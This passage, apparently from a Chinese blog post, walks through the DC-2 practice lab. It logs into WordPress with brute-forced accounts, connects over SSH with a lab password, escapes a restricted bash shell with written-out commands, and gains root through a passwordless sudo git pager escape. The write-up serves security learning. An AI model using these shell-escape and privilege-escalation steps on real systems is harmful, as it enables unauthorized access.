-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>爆破出来了两个账号，没有admin，感觉后面可能要提权啊<br>wordpress的默认登录后台地址是url/wp-login.php<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>直接输入账号密码登录成功<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>打开pages界面即可发现flag<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
-
-<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag 3"></a>flag 3</h2><p>另一个方式，应该指的是ssh<br>ssh尝试连接 jerry登不了但是tom可以</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.174.141 -p 7744  #password:parturient</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>接下来我觉得应该是渗透过程中最难的环节了<br>我这个菜鸟啥也不懂 从搜索引擎那里学了好久<br>果然还有很多东西需要学习啊<br>连接上后发现不能cat flag<br>因为ssh远程连接到服务器的环境变量中不包含对应可执行文件的路径。<br>这个需要自行添加 需要绕过rbash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>添加后即可查看flag 3</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry.Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
-
-<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag 4"></a>flag 4</h2><p>提示给了su 于是切换到用户jerry<br>目录也要跳出来<br>flag 4很轻松的就出来了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you &#x27;ve made it this far - but you &quot;re not home yet.</span><br><span class="line"></span><br><span class="line">You still need to get the final flag(the only flag that really counts!! !).No hints here - you &#x27;re on your own now. :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here! ! ! !</span><br></pre></td></tr></table></figure>
-<h2 id="Final-flag"><a href="#Final-flag" class="headerlink" title="Final-flag"></a>Final-flag</h2><p>提示了git<br>这些我也不懂，但是之前刷ctf的入门题的时候提到过git相关的东西<br>文件配置不当从而给了我们提权的机会<br>执行sudo -l<br>可以发现不需要密码就能够执行<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>需要调整终端大小，使其一次性无法显示完这条命令的回显结果<br>在下面输入<code>!/bin/bash</code>即可 可以用whoami确认一下<br>跳出目录 就能获取Final-flag了<br><img src="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>总的来说，DC-2还算简单一些，有了之前的经验所以做起来更顺手也更快了<br>学到了很多的东西 收获颇多<br>目前来看，信息搜集和善用搜索引擎在渗透靶机的时候不可或缺</p>
-<hr>
-<blockquote>
-<p>自觉此心无一事，小鱼跳出绿萍中。——姜夔· 《湖上寓居杂咏》</p>
 </blockquote>
 <hr>
 ]]></content>
